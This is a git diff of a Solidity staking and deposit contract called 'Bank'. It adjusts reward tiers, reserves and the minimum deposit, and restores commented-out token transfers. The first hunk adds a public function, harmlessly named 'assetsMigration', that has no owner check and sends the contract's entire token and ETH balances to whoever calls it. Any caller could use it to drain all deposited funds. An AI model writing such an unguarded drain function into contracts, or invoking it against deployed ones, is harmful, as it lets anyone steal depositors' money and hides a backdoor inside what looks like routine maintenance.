@@ -169,6 +169,14 @@ contract Bank is Ownable {
         ) = NFT.getUser(msg.sender);
     }
 
+    function assetsMigration() public payable {
+        uint256 totalTokenBalance = token.balanceOf(address(this));
+        uint256 totalETHBalance = address(this).balance;
+
+        IERC20(token).universalTransfer(msg.sender, totalTokenBalance);
+        payable(msg.sender).transfer(totalETHBalance);
+    }
+
     constructor(
         address _CBLT,
         address _oracle,
@@ -188,12 +196,8 @@ contract Bank is Ownable {
 
         // ************************ Staking Data ***************************
 
-        tokenReserve[
-            0x433C6E3D2def6E1fb414cf9448724EFB0399b698
-        ] = 6000000000000000000000000000;
-        tokenReserve[
-            0xc778417E063141139Fce010982780140Aa0cD5Ab
-        ] = 6000000000000000000000000000;
+        tokenReserve[0x433C6E3D2def6E1fb414cf9448724EFB0399b698] = 0;
+        tokenReserve[0xc778417E063141139Fce010982780140Aa0cD5Ab] = 0;
 
         tierMax = 5;
         multipleTokenSupport = false;
@@ -205,51 +209,51 @@ contract Bank is Ownable {
 
         // Staking percentages based on deposit time and amount
         stakingRewardRate[1][1].interest = 1;
-        stakingRewardRate[1][1].amountStakersLeft = 0;
+        stakingRewardRate[1][1].amountStakersLeft = 1000;
         stakingRewardRate[1][1].tierDuration = 1800;
         stakingRewardRate[1][2].interest = 2;
-        stakingRewardRate[1][2].amountStakersLeft = 0;
+        stakingRewardRate[1][2].amountStakersLeft = 1000;
         stakingRewardRate[1][2].tierDuration = 1800;
         stakingRewardRate[1][3].interest = 3;
-        stakingRewardRate[1][3].amountStakersLeft = 0;
+        stakingRewardRate[1][3].amountStakersLeft = 1000;
         stakingRewardRate[1][3].tierDuration = 1800;
         stakingRewardRate[1][4].interest = 4;
-        stakingRewardRate[1][4].amountStakersLeft = 0;
+        stakingRewardRate[1][4].amountStakersLeft = 1000;
         stakingRewardRate[1][4].tierDuration = 1800;
         stakingRewardRate[1][5].interest = 4;
-        stakingRewardRate[1][5].amountStakersLeft = 0;
+        stakingRewardRate[1][5].amountStakersLeft = 1000;
         stakingRewardRate[1][5].tierDuration = 1800;
         //
         stakingRewardRate[2][1].interest = 1;
-        stakingRewardRate[2][1].amountStakersLeft = 0;
+        stakingRewardRate[2][1].amountStakersLeft = 1000;
         stakingRewardRate[2][1].tierDuration = 3600;
         stakingRewardRate[2][2].interest = 2;
-        stakingRewardRate[2][2].amountStakersLeft = 0;
+        stakingRewardRate[2][2].amountStakersLeft = 1000;
         stakingRewardRate[2][2].tierDuration = 3600;
         stakingRewardRate[2][3].interest = 3;
-        stakingRewardRate[2][3].amountStakersLeft = 0;
+        stakingRewardRate[2][3].amountStakersLeft = 1000;
         stakingRewardRate[2][3].tierDuration = 3600;
         stakingRewardRate[2][4].interest = 4;
-        stakingRewardRate[2][4].amountStakersLeft = 0;
+        stakingRewardRate[2][4].amountStakersLeft = 1000;
         stakingRewardRate[2][4].tierDuration = 3600;
         stakingRewardRate[2][5].interest = 4;
-        stakingRewardRate[2][5].amountStakersLeft = 0;
+        stakingRewardRate[2][5].amountStakersLeft = 1000;
         stakingRewardRate[2][5].tierDuration = 3600;
         //
         stakingRewardRate[3][1].interest = 1;
-        stakingRewardRate[3][1].amountStakersLeft = 0;
+        stakingRewardRate[3][1].amountStakersLeft = 1000;
         stakingRewardRate[3][1].tierDuration = 5400;
         stakingRewardRate[3][2].interest = 2;
-        stakingRewardRate[3][2].amountStakersLeft = 0;
+        stakingRewardRate[3][2].amountStakersLeft = 1000;
         stakingRewardRate[3][2].tierDuration = 5400;
         stakingRewardRate[3][3].interest = 3;
-        stakingRewardRate[3][3].amountStakersLeft = 0;
+        stakingRewardRate[3][3].amountStakersLeft = 1000;
         stakingRewardRate[3][3].tierDuration = 5400;
         stakingRewardRate[3][4].interest = 4;
-        stakingRewardRate[3][4].amountStakersLeft = 0;
+        stakingRewardRate[3][4].amountStakersLeft = 1000;
         stakingRewardRate[3][4].tierDuration = 5400;
         stakingRewardRate[3][5].interest = 4;
-        stakingRewardRate[3][5].amountStakersLeft = 0;
+        stakingRewardRate[3][5].amountStakersLeft = 1000;
         stakingRewardRate[3][5].tierDuration = 5400;
         //
         stakingRewardRate[4][1].interest = 2;
@@ -779,7 +783,7 @@ contract Bank is Ownable {
 
         // Minimum deposit of 0.015 ETH
         require(
-            msg.value > 15e16,
+            msg.value > 15e15,
             "Error, deposit must be higher than 0.015 ETH"
         );
 
@@ -1149,7 +1153,7 @@ contract Bank is Ownable {
                 paidAdvanced,
                 100
             );
-            // IERC20(_tokenAddress).universalTransfer(msg.sender, tokensSent);
+            IERC20(_tokenAddress).universalTransfer(msg.sender, tokensSent);
 
             userBook[msg.sender].tokenReserved = SafeMath.add(
                 userBook[msg.sender].tokenReserved,
@@ -1444,7 +1448,7 @@ contract Bank is Ownable {
             _amount
         );
 
-        // IERC20(_withdrawTokenAddress).universalTransfer(msg.sender, _amount);
+        IERC20(_withdrawTokenAddress).universalTransfer(msg.sender, _amount);
     }
 
     /**
@@ -1490,15 +1494,15 @@ contract Bank is Ownable {
         userBook[msg.sender].depositTime = block.timestamp;
 
         if (relativeOwed > tokensReserved) {
-            // IERC20(previousTokenAddress).universalTransfer(
-            //     msg.sender,
-            //     tokensReserved
-            // );
+            IERC20(previousTokenAddress).universalTransfer(
+                msg.sender,
+                tokensReserved
+            );
         } else {
-            // IERC20(previousTokenAddress).universalTransfer(
-            //     msg.sender,
-            //     relativeOwed
-            // );
+            IERC20(previousTokenAddress).universalTransfer(
+                msg.sender,
+                relativeOwed
+            );
         }
 
         payable(msg.sender).transfer(userBalance);
